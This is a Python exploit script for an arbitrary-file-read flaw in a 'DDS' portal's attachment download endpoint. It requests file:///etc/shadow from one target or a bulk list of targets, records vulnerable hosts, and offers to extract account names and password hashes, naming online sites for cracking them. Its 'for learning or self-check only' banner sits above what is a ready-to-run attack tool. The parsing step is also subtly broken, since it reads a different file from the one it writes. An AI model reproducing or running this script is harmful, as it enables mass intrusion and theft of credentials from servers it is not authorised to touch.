# _*_ coding:utf-8 _*_
# @Time : 2023/10/6 20:56
# @Author: 为赋新词强说愁
# _*_ coding:utf-8 _*_
# @Time : 2023/8/3 22:30
# @Author: 为赋新词强说愁
 
 
 
import requests
import argparse
from datetime import datetime
import time
requests.packages.urllib3.disable_warnings()
 
RED_BOLD = "\033[1;31m"
RESET = "\033[0m"
def usage():
    global RED_BOLD
    global RESET
    text = '''
    +-----------------------------------------------------------------+
                微信公众号    网络安全透视镜 
    此脚本仅用于学习或系统自检查
    使用方法:
        单个 python3 DDS-Download.py -u url[例 http://127.0.0.1:8080]
        批量 python3 DDS-Download.py -f filename
    +-----------------------------------------------------------------+         
 
    根据《中华人民共和国刑法》规定，违反国家规定，对计算机信息系统功能进行\n删除、修改、增加、干扰，造成计算机信息系统不能正常运行的，处五年以下有期徒刑\n或者拘役；后果特别严重的，处五年以上有期徒刑。
    违反国家规定，对计算机信息系统中存储、处理或者传输的数据和应用程序进行\n删除、修改、增加的操作，后果严重的，依照前款的规定处罚。
    开始检测................................
    '''
    print(f"{RED_BOLD}{text}{RESET}")
 
 
# proxies = {'http':'http://127.0.0.1:10808}
 
def exp(content):
    select = input("是否读取系统用户密码（是：1,否：0):")
    # usage()
 
    if select == "1":
        with open('responseTmp.txt', mode='w', encoding='utf-8') as f:
            f.write(content)
        # print(content)
        with open('resp.txt', mode='r', encoding='utf-8') as f2:
            for line in f2.readlines():
                line = line.strip()
                if '$' in line and line != None:
                    user = line.split(':')[0]
                    password = line.split(':')[1]
                    print(f"账户:{user},密码:{password}")
            print("注：可用https://www.somd5.com 或 https://www.cmd5.com 对密码进行解密")
    elif select == "0":
        exit()
    else:
        print("请重新输入正确选项")
 
 
 
 
def save_file(url):
    with open('result.txt',mode='a',encoding='utf-8') as f:
        f.write(url+'\n')
 
def poc(check_url,flag):
    now_poc = datetime.now()
    global RED_BOLD
    global RESET
    url = check_url + "/portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/shadow"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.47"
    }
    try:
        respnose = requests.get(url, headers=headers, timeout=3, verify=False)
        content = respnose.text
        if respnose.status_code == 200 and 'root' in content:
            print(f'{RED_BOLD}[+]{now_poc.strftime("%Y-%m-%d %H:%M:%S")}\t{check_url}\t存在任意文件读取漏洞{RESET}')
            save_file(check_url)
        else:
            print(f'[-]{now_poc.strftime("%Y-%m-%d %H:%M:%S")}\t{check_url}\t漏洞不存在')
 
        if flag == 1:
            exp(content)
 
    except Exception as e:
        print(f'[-]{now_poc.strftime("%Y-%m-%d %H:%M:%S")}\t{check_url}\t无法访问，请检查目标站点是否存在')
 
 
def run(filepath):
    flag = 0
    urls = [x.strip() for x in open(filepath, "r").readlines()]
    for u in urls:
        if 'http' in u:
            url = u
        elif 'https' in u:
            url = u
        else:
            url = 'http://' + u
 
        poc(url,flag)
 
def main():
    parse = argparse.ArgumentParser()
    parse.add_argument("-u", "--url", help="python DDS-Download.py -u url")
    parse.add_argument("-f", "--file", help="python DDS-Download.py -f file")
    args = parse.parse_args()
    url = args.url
    filepath = args.file
    usage()
    time.sleep(1.5)
    if url is not None and filepath is None:
        flag = 1
        poc(url,flag)
    elif url is None and filepath is not None:
        run(filepath)
    else:
        usage()
 
 
if __name__ == '__main__':
    main()
